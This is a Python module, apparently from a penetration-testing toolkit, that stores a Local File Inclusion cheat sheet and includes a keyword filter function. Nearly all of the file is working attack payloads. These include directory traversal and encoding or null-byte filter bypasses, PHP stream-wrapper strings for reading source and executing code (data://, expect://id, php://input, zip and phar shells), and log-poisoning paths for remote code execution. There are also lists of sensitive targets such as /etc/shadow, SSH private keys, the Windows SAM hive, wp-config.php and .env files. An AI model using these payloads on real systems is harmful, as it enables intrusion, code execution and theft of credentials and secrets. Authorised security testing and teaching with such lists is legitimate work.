"""LFI (Local File Inclusion) cheat sheet."""

LFI_CHEATSHEET = {
    "title": "LFI (Local File Inclusion) Cheat Sheet",
    "categories": {
        "basic_traversal": {
            "title": "Basic Path Traversal",
            "description": "Standard directory traversal payloads",
            "payloads": [
                {"payload": "../", "description": "Single traversal"},
                {"payload": "../../", "description": "Double traversal"},
                {"payload": "../../../", "description": "Triple traversal"},
                {"payload": "../../../../", "description": "4x traversal"},
                {"payload": "../../../../../", "description": "5x traversal"},
                {"payload": "../../../../../../etc/passwd", "description": "Linux passwd"},
                {"payload": "..\\..\\..\\..\\windows\\win.ini", "description": "Windows win.ini"},
            ],
        },

        "encoding_bypass": {
            "title": "Encoding Bypass",
            "description": "Bypass filters using various encodings",
            "payloads": [
                {"payload": "..%2f", "description": "URL encoded /"},
                {"payload": "..%252f", "description": "Double URL encoded /"},
                {"payload": "%2e%2e/", "description": "URL encoded .."},
                {"payload": "%2e%2e%2f", "description": "Full URL encoded ../"},
                {"payload": "..%c0%af", "description": "UTF-8 overlong /"},
                {"payload": "..%c1%9c", "description": "UTF-8 overlong \\"},
                {"payload": "%c0%ae%c0%ae/", "description": "UTF-8 overlong .."},
                {"payload": "....//", "description": "Filter bypass double"},
                {"payload": "....\\\\", "description": "Windows filter bypass"},
                {"payload": "..;/", "description": "Semicolon bypass"},
            ],
        },

        "null_byte": {
            "title": "Null Byte Injection",
            "description": "Bypass extension checks (PHP < 5.3.4)",
            "payloads": [
                {"payload": "../../../etc/passwd%00", "description": "Null byte terminator"},
                {"payload": "../../../etc/passwd%00.php", "description": "Null byte with extension"},
                {"payload": "../../../etc/passwd%00.html", "description": "Null byte html"},
                {"payload": "../../../etc/passwd%00.jpg", "description": "Null byte image"},
            ],
        },

        "php_wrappers": {
            "title": "PHP Wrappers",
            "description": "PHP stream wrappers for file inclusion",
            "payloads": [
                {"payload": "php://filter/convert.base64-encode/resource=index.php", "description": "Base64 encode source"},
                {"payload": "php://filter/read=convert.base64-encode/resource=config.php", "description": "Read config as base64"},
                {"payload": "php://input", "description": "Read POST body as code"},
                {"payload": "php://stdin", "description": "Read from stdin"},
                {"payload": "data://text/plain,<?php phpinfo(); ?>", "description": "Data wrapper code exec"},
                {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "description": "Base64 data wrapper"},
                {"payload": "expect://id", "description": "Command execution"},
                {"payload": "zip://shell.zip%23shell.php", "description": "Zip wrapper"},
                {"payload": "phar://shell.phar/shell.php", "description": "Phar wrapper"},
            ],
        },

        "linux_files": {
            "title": "Linux Sensitive Files",
            "description": "Important files to read on Linux systems",
            "payloads": [
                {"payload": "/etc/passwd", "description": "User accounts"},
                {"payload": "/etc/shadow", "description": "Password hashes"},
                {"payload": "/etc/hosts", "description": "Hosts file"},
                {"payload": "/etc/hostname", "description": "System hostname"},
                {"payload": "/etc/issue", "description": "System banner"},
                {"payload": "/proc/version", "description": "Kernel version"},
                {"payload": "/proc/self/environ", "description": "Environment vars"},
                {"payload": "/proc/self/cmdline", "description": "Process cmdline"},
                {"payload": "/var/log/apache2/access.log", "description": "Apache access log"},
                {"payload": "/var/log/apache2/error.log", "description": "Apache error log"},
                {"payload": "/var/log/nginx/access.log", "description": "Nginx access log"},
                {"payload": "/var/log/auth.log", "description": "Auth log"},
                {"payload": "/home/*/.ssh/id_rsa", "description": "SSH private key"},
                {"payload": "/root/.bash_history", "description": "Root history"},
            ],
        },

        "windows_files": {
            "title": "Windows Sensitive Files",
            "description": "Important files to read on Windows systems",
            "payloads": [
                {"payload": "C:\\boot.ini", "description": "Boot config"},
                {"payload": "C:\\Windows\\win.ini", "description": "Windows config"},
                {"payload": "C:\\Windows\\System32\\drivers\\etc\\hosts", "description": "Hosts file"},
                {"payload": "C:\\Windows\\System32\\config\\SAM", "description": "SAM database"},
                {"payload": "C:\\Windows\\System32\\config\\SYSTEM", "description": "System hive"},
                {"payload": "C:\\inetpub\\wwwroot\\web.config", "description": "IIS config"},
                {"payload": "C:\\inetpub\\logs\\LogFiles", "description": "IIS logs"},
            ],
        },

        "log_poisoning": {
            "title": "Log Poisoning to RCE",
            "description": "Inject PHP code into logs then include them",
            "payloads": [
                {"payload": "/var/log/apache2/access.log", "description": "Apache access log (inject via User-Agent)"},
                {"payload": "/var/log/apache2/error.log", "description": "Apache error log"},
                {"payload": "/var/log/nginx/access.log", "description": "Nginx access log"},
                {"payload": "/var/log/mail.log", "description": "Mail log (inject via email)"},
                {"payload": "/var/log/vsftpd.log", "description": "FTP log (inject via username)"},
                {"payload": "/proc/self/fd/0", "description": "Process file descriptors"},
                {"payload": "/proc/self/environ", "description": "Environment (inject via headers)"},
            ],
        },

        "webapp_files": {
            "title": "Web Application Files",
            "description": "Common web application configuration files",
            "payloads": [
                {"payload": "/var/www/html/wp-config.php", "description": "WordPress config"},
                {"payload": "/var/www/html/config.php", "description": "Generic config"},
                {"payload": "/var/www/html/.htaccess", "description": "Apache htaccess"},
                {"payload": "/var/www/html/.env", "description": "Environment file"},
                {"payload": "config/database.yml", "description": "Rails database config"},
                {"payload": "settings.py", "description": "Django settings"},
                {"payload": "application.properties", "description": "Spring config"},
            ],
        },
    },
}


def get_cheatsheet(category: str = None, filter_keyword: str = None) -> dict:
    """Get LFI cheatsheet."""
    if category and category in LFI_CHEATSHEET["categories"]:
        result = {
            "title": LFI_CHEATSHEET["title"],
            "categories": {category: LFI_CHEATSHEET["categories"][category]},
        }
    else:
        result = LFI_CHEATSHEET

    if filter_keyword:
        filtered_categories = {}
        for cat_name, cat_data in result["categories"].items():
            filtered_payloads = [
                p for p in cat_data["payloads"]
                if filter_keyword.lower() in p["payload"].lower()
                or filter_keyword.lower() in p["description"].lower()
            ]
            if filtered_payloads:
                filtered_categories[cat_name] = {
                    **cat_data,
                    "payloads": filtered_payloads,
                }
        result["categories"] = filtered_categories

    return result
